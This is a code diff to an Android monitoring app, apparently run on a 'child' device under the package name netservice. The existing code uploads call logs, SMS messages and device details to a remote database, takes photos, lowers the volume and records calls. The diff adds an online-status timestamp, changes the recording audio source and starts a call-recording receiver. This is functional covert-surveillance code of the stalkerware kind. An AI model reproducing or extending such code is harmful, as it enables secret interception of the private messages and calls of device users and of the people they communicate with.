@@ -11,6 +11,7 @@ import android.net.ConnectivityManager
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
+import android.util.Log
 import android.widget.Button
 import android.widget.RelativeLayout
 import android.widget.Switch
@@ -49,6 +50,7 @@ import com.dtz.netservice.utils.Consts.COMMAND_GRANT_PERMISSION
 import com.dtz.netservice.utils.Consts.CONTACTS
 import com.dtz.netservice.utils.Consts.DATA
 import com.dtz.netservice.utils.Consts.DEVICE_NAME
+import com.dtz.netservice.utils.Consts.DEVICE_ONLINE
 import com.dtz.netservice.utils.Consts.INTERVAL
 import com.dtz.netservice.utils.Consts.PARAMS
 import com.dtz.netservice.utils.Consts.PERMISSION_USAGE_STATS
@@ -72,6 +74,9 @@ import com.jaredrummler.android.device.DeviceName
 import com.pawegio.kandroid.show
 import kotterknife.bindView
 import java.io.File
+import java.nio.file.Files
+import java.nio.file.Path
+import java.nio.file.Paths
 import javax.inject.Inject
 
 /**
@@ -110,10 +115,12 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
 
     private fun init() {
 
+        val current = System.currentTimeMillis()
         //data
         getReference("$DATA/$CHILD_SHOW_APP").setValue(true)
         getReference("$DATA/$CHILD_NAME").setValue(childSelected)
         getReference("$DATA/$DEVICE_NAME").setValue(DeviceName.getDeviceName())
+        getReference("$DATA/$DEVICE_ONLINE").setValue(current)
 
         //photo
         val childPhoto = ChildPhoto(false, CameraFacing.FRONT_FACING_CAMERA)
@@ -143,7 +150,7 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
         val callList = CallLogs.callList(this)
         getReference("$CALLLOGS/").setValue(callList)
 
-        //Contacts
+        //SMS
         val smsList = SMSes.smsList(this)
         getReference("$SMSES/").setValue(smsList)
 
@@ -155,7 +162,6 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
         reduceVolume()
         val filter = IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION)
         registerReceiver(connectReceiver, filter)
-
     }
 
     private fun reduceVolume() {
@@ -280,10 +286,11 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
             .setRecordDirPath(callsFolder.path) // optional & default value
             .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB) // optional & default value
             .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB) // optional & default value
-            .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION) // optional & default value
+            .setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION) // optional & default value
             .setShowSeed(true) // optional & default value ->Ex: RecordFileName_incoming.amr || RecordFileName_outgoing.amr
             .build()
 
+        callRecord.startCallReceiver()
         callRecord.startCallRecordService()
     }
 
